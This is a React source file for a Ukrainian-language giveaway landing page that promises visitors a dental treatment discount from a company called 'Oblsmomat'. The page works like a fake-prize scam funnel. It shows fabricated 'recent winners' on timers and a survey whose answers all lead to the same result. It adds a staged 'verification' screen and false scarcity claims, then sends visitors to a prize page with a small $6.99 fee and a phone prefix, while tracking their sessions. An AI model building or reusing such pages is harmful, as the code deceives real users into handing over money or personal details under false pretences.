import React, { useState, useEffect } from "react";
import VerificationPage from "./VerificationPage";
import PrizePage from "./PrizePage";
import { months_localized, days_localized } from "./FirstDialog";
import PrizeWinners from "./PrizeWinners";
import FaqPanel from "./FaqPanel";
import Clarity from '@microsoft/clarity';

export const lang = "ua";

function App() {
  const [currentQuestion, setCurrentQuestion] = useState(0);
  const [animating, setAnimating] = useState(false);
  const [animationClass, setAnimationClass] = useState("fade-enter-active");
  const [showVerification, setShowVerification] = useState(false);
  const [currentWinnerIndex, setCurrentWinnerIndex] = useState(null);
  const [faqOpen, setFaqOpen] = useState(false);
  const [questionTransitioning, setQuestionTransitioning] = useState(false);

  const filepath = "./"; // './' || 'assets/'
  const company = "Oblsmomat";
  const projectId = "pcqzk23pf3"
  Clarity.init(projectId);
  const item = "знижку на 10% на лікування";
  const country = "Україна";
  const price = "$6.99";
  const staticPrefix = "+38";
  const countryCode = "UA";
  const fullPrice = "$178";
  const questions = [
    {
      id: 1,
      question: "Чи маєте ви дійсну адресу проживання в Україні?",
      buttons: ["Так", "Ні"],
    },
    {
      id: 2,
      question: "Чи чули ви про нашу компанію?",
      buttons: ["Так", "Ні"],
    },
    {
      id: 3,
      question: "Як часто ви користуєтеся послугами стоматологій?",
      buttons: ["Ніколи", "Рідко", "Часто"],
    },
  ];

  useEffect(() => {
    if (currentQuestion < questions.length) {
      Clarity.tag('question-page');
    } else if (showVerification) {
      Clarity.tag('verification-page');
    } else if (faqOpen) {
      Clarity.tag('faq-page');
    } else {
      Clarity.tag('prize-page');
    }
  }, [currentQuestion, showVerification, faqOpen]);

  const winners = [
    {
      name: "Дмитро ******ко",
      address: "Запоріжжя, Україна",
      time: "14 секунд тому",
    },
    {
      name: "Анастасія ******ва",
      address: "Дніпро, Україна",
      time: "35 секунд тому",
    },
  ];

  useEffect(() => {
    const winnerTimers = [];
    setTimeout(() => {
      setCurrentWinnerIndex(0);
      winnerTimers.push(
        setTimeout(() => {
          setCurrentWinnerIndex(null);
          winnerTimers.push(
            setTimeout(() => {
              setCurrentWinnerIndex(1);
              winnerTimers.push(
                setTimeout(() => {
                  setCurrentWinnerIndex(null);
                }, 7000)
              );
            }, 7000)
          );
        }, 7000)
      );
    }, 5000);
    return () => winnerTimers.forEach(clearTimeout);
  }, []);

  useEffect(() => {
    if (animating) {
      setAnimationClass("fade-exit-active");
      const timer = setTimeout(() => {
        setCurrentQuestion((prev) => prev + 1);
        setAnimationClass("fade-enter");
        setTimeout(() => setAnimationClass("fade-enter-active"), 0);
        setAnimating(false);
        setQuestionTransitioning(false);
      }, 1000);
      return () => clearTimeout(timer);
    }
  }, [animating]);

  const nextQuestion = () => {
    if (!questionTransitioning) {
      setAnimating(true);
      setQuestionTransitioning(true);
    }
  };

  useEffect(() => {
    if (currentQuestion > 2) {
      setShowVerification(true);
      const timer = setTimeout(() => {
        setShowVerification(false);
      }, 3500);
      return () => clearTimeout(timer);
    }
  }, [currentQuestion]);

  const currentDate = new Date();
  const monthIndex = currentDate.getMonth();
  const dayIndex = currentDate.getDay();

  const formattedDate = `${currentDate.getDate()} ${
    months_localized[lang][monthIndex]
  } ${currentDate.getFullYear()}`;
  const dayOfWeek = days_localized[lang][dayIndex];

  return (
    <div className="bg-gray-100 min-h-screen w-full overflow-x-hidden">
      <header className="h-[60px] flex justify-between mb-2 bg-[#fff]">
        <div className="h-[50px] w-full flex justify-between items-center px-4 md:px-[2%]">
          <div className="flex items-center gap-2">
            <div className="w-6">
              <img src={`${filepath}flag.png`} alt="flag" />
            </div>
            <p className="font-semibold">UA</p>
          </div>
          <div className="absolute left-1/2 mt-2 transform -translate-x-1/2 flex justify-center items-center h-[20px] w-auto max-w-[150px] sm:h-[25px] sm:max-w-[100px] md:h-[50px] md:max-w-[200px]">
            <img
              src={`${filepath}logo.png`}
              className="sm:h-[40px] md:h-[30px]"
              alt="Logo"
            />
          </div>
          <div className="h-[50px] flex items-center gap-4">
            <img
              src={`${filepath}menu.png`}
              className="h-[20px] w-[20px] block sm:block md:block lg:hidden"
              alt="Menu"
            />
            <div className="hidden lg:flex items-center gap-4">
              <img
                src={`${filepath}./pin.svg`}
                className="h-[20px] w-[20px] fill-white"
                alt="Pin"
              />
              <img
                src={`${filepath}user.svg`}
                className="h-[20px] w-[20px]"
                alt="User"
              />
              <img
                src={`${filepath}cart.svg`}
                className="h-[25px] w-[25px]"
                alt="Cart"
              />
            </div>
          </div>
        </div>
      </header>

      {currentWinnerIndex !== null && (
        <PrizeWinners
          name={winners[currentWinnerIndex].name}
          place={winners[currentWinnerIndex].address}
          item={item}
          time={winners[currentWinnerIndex].time}
          filepath={filepath}
        />
      )}

      {currentQuestion < questions.length ? (
        <div className="flex flex-col items-center justify-center px-4">
          <div
            className={`w-full flex flex-col justify-center items-center bg-white p-4 rounded-lg shadow-lg`}
          >
            <h2 className="font-bold text-3xl text-[#232F3E] mb-2">
              Вітаємо!
            </h2>
            <div className="w-full flex-col justify-start items-start">
              <p className="text-sm mb-1 text-center">
                Ви були обрані для участі в акції від {company}!
              </p>
              <p className="text-sm mb-1 text-center">
                {company} пропонує акцію {dayOfWeek} ({formattedDate})
              </p>
              <p className="text-sm mb-1 text-center">
                Ви можете виграти {" "}
                <span className="font-semibold">знижку на лікування від 10% до 30%</span>
              </p>
            </div>

            <img
              src={`${filepath}main.png`}
              alt="Основний продукт"
              className="w-full max-w-[300px] m-2"
            />

            <p className="text-sm mb-4 text-center">
              Щоб отримати <span className="font-semibold">знижку на лікування від 10% до 30%</span>, заповніть форму та підтвердьте, що ви реальна людина.
            </p>
            <p className="text-sm font-bold text-red-500 mb-4 text-center">
              Слідкуйте за новинами!!! Залишилося не дуже багато подарунків!
            </p>
            <div
              className={`w-full flex flex-col items-center ${animationClass}`}
            >
              <div className="w-full flex flex-col items-center gap-2 mb-2">
                <span className="font-bold text-sm">
                  Питання {questions[currentQuestion].id} з {questions.length}
                </span>
                <p className="text-sm text-center">
                  {questions[currentQuestion].question}
                </p>
              </div>
              {questions[currentQuestion].buttons.map((button, i) => (
                <button
                  key={i}
                  onClick={nextQuestion}
                  className="w-[90%] mb-2 button-color rounded-md text-white p-2"
                  disabled={questionTransitioning}
                >
                  <span className="font-semibold">{button}</span>
                </button>
              ))}
            </div>
            <button
              className="absolute bottom-4 right-4"
              onClick={() => setFaqOpen(true)}
            >
              <img src={`${filepath}faq.svg`} alt="faq" />
            </button>
          </div>
        </div>
      ) : showVerification ? (
        <VerificationPage filepath={filepath} />
      ) : (
        <PrizePage
          item={item}
          price={price}
          country={country}
          filepath={filepath}
          faqOpen={faqOpen}
          setFaqOpen={setFaqOpen}
          staticPrefix={staticPrefix}
          countryCode={countryCode}
          fullPrice={fullPrice}
          company={company}
        />
      )}

      <FaqPanel
        faqOpen={faqOpen}
        setFaqOpen={setFaqOpen}
        price={price}
        filepath={filepath}
      />
    </div>
  );
}

export default App;
